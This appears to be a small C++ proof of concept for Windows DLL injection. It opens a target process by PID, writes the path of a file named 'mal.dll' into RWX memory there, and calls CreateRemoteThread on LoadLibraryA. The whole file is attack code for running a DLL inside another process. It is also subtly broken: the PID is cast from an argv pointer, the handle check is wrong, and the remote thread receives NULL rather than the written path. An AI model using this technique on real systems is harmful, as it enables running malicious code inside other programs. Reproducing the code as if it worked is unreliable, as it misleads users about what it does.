#include <windows.h>
#include <iostream>

int main(int argc, char const *argv[])
{

    DWORD pid = (DWORD)argv[3];
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);
    char const path[] = "C:\\Users\\P1erce\\Projects\\CDSE\\mal.dll";
    size_t bytesWritten{};
    if (hProcess == INVALID_HANDLE_VALUE)
    {
        printf("Failed to open process. Error %d\n", GetLastError());
        return 1;
    }

    LPVOID dllPathAddr = VirtualAllocEx(hProcess, NULL, sizeof(path), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (dllPathAddr == NULL)
    {
        printf("Failed to open process. Error %d\n", GetLastError());
        return 1;
    }
    else
    {
        printf("\n[+] Allocated RW memory region in remote address : 0x%p\n", dllPathAddr);
    }

    WriteProcessMemory(hProcess, dllPathAddr, path, sizeof(path), &bytesWritten);

    LPDWORD threadID{};
    CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA"), NULL, 0, threadID);

    return 0;
}
